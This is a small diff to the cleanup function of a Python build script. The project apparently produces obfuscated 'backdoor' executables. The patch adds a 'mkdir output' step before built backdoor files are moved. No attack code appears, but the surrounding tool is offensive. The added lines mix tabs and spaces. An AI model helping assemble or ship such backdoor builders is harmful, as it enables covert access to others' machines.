@@ -193,9 +193,11 @@ example (default options): --obf-mod 2  --obf-code 2 --wrap-mode 1 --advanced 2
 # clean up junk files and directories
 def cleanup():
     if os_type == "linux":
+    	subprocess.call("mkdir output", shell=True)
         subprocess.call("mv dist/backdoor* output/", shell=True)
         subprocess.call("rm -rf build/ dist/ *.spec", shell=True)
     elif os_type == "windows":
+    	subprocess.call("mkdir output", shell=True)
         subprocess.call("move dist\\backdoor* output ", shell=True)
         subprocess.call("rmdir /s /Q build dist", shell=True)
         subprocess.call("del /f /Q *.spec", shell=True)
